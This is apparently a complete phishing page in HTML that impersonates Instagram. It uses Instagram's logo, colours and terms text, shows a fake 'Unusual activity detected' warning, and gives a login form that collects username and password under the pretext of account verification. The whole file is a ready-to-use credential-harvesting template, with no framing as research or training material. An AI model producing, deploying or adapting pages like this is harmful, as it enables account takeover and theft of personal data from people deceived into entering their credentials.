<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram • Secure your account</title>
<link rel="icon" href="https://www.instagram.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #fafafa;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
    width: 100%;
    max-width: 400px;
    padding: 40px 32px 24px;
    text-align: center;
  }
  .logo {
    width: 64px; height: 64px; margin: 0 auto 20px;
    background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
  }
  .logo svg { width: 40px; height: 40px; fill: #fff; }
  .title {
    font-size: 15px; color: #262626; font-weight: 600;
    line-height: 1.4; margin-bottom: 24px;
  }
  .field { position: relative; margin-bottom: 8px; }
  .field input {
    width: 100%;
    padding: 14px 12px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 6px;
    font-size: 14px;
    color: #262626;
    outline: none;
  }
  .field input:focus { border-color: #a8a8a8; background: #fff; }
  .field label {
    position: absolute; left: 12px; top: 12px;
    font-size: 12px; color: #8e8e8e;
    pointer-events: none;
    transition: all .15s;
  }
  .field input:focus + label,
  .field input:not(:placeholder-shown) + label {
    top: 4px; font-size: 10px;
  }
  .btn {
    width: 100%;
    padding: 12px;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-weight: 600;
    font-size: 14px;
    margin-top: 12px;
    cursor: pointer;
  }
  .btn:active { background: #1877f2; }
  .divider {
    display: flex; align-items: center; gap: 16px;
    margin: 20px 0; color: #8e8e8e; font-size: 12px;
  }
  .divider::before, .divider::after {
    content: ""; flex: 1; height: 1px; background: #dbdbdb;
  }
  .footer {
    font-size: 12px; color: #8e8e8e; margin-top: 18px; line-height: 1.5;
  }
  .warning {
    background: #fff4e5;
    border: 1px solid #ffd79a;
    color: #8a5a00;
    padding: 10px 12px;
    border-radius: 6px;
    font-size: 12px;
    margin-bottom: 20px;
    text-align: left;
    line-height: 1.5;
  }
</style>
</head>
<body>
<form class="card" method="POST" action="">
  <div class="logo">
    <svg viewBox="0 0 24 24"><path d="M12 2.2c3.2 0 3.6 0 4.9.1 1.2.1 1.8.3 2.2.4.6.2 1 .5 1.4.9.4.4.7.8.9 1.4.2.4.4 1 .4 2.2.1 1.3.1 1.7.1 4.9s0 3.6-.1 4.9c-.1 1.2-.3 1.8-.4 2.2-.2.6-.5 1-.9 1.4-.4.4-.8.7-1.4.9-.4.2-1 .4-2.2.4-1.3.1-1.7.1-4.9.1s-3.6 0-4.9-.1c-1.2-.1-1.8-.3-2.2-.4-.6-.2-1-.5-1.4-.9-.4-.4-.7-.8-.9-1.4-.2-.4-.4-1-.4-2.2-.1-1.3-.1-1.7-.1-4.9s0-3.6.1-4.9c.1-1.2.3-1.8.4-2.2.2-.6.5-1 .9-1.4.4-.4.8-.7 1.4-.9.4-.2 1-.4 2.2-.4 1.3-.1 1.7-.1 4.9-.1M12 0C8.7 0 8.3 0 7 .1 5.7.2 4.8.4 4 .7c-.8.3-1.5.8-2.2 1.4C1.1 2.8.7 3.5.4 4.3c-.3.8-.5 1.7-.6 3C-.2 8.6 0 9 0 12s0 3.4.1 4.7c.1 1.3.3 2.2.6 3 .3.8.7 1.5 1.4 2.2.7.7 1.4 1.1 2.2 1.4.8.3 1.7.5 3 .6 1.3.1 1.7.1 4.7.1s3.4 0 4.7-.1c1.3-.1 2.2-.3 3-.6.8-.3 1.5-.7 2.2-1.4.7-.7 1.1-1.4 1.4-2.2.3-.8.5-1.7.6-3 .1-1.3.1-1.7.1-4.7s0-3.4-.1-4.7c-.1-1.3-.3-2.2-.6-3-.3-.8-.7-1.5-1.4-2.2C20.5 1.1 19.8.7 19 .4c-.8-.3-1.7-.5-3-.6C14.7 0 14.3 0 11 0z"/></svg>
  </div>
  <div class="warning">⚠️ Unusual activity detected. Verify your identity to keep your account secure.</div>
  <div class="title">Secure your Instagram account via verification</div>
  <div class="field">
    <input type="text" name="username" id="username" placeholder=" " required autocomplete="off">
    <label for="username">Username, Email, Mobile number</label>
  </div>
  <div class="field">
    <input type="password" name="password" id="password" placeholder=" " required>
    <label for="password">Password</label>
  </div>
  <button type="submit" class="btn">Log In</button>
  <div class="divider">OR</div>
  <div class="footer">By continuing, you agree to Instagram's Terms and Privacy Policy.</div>
</form>
</body>
</html>
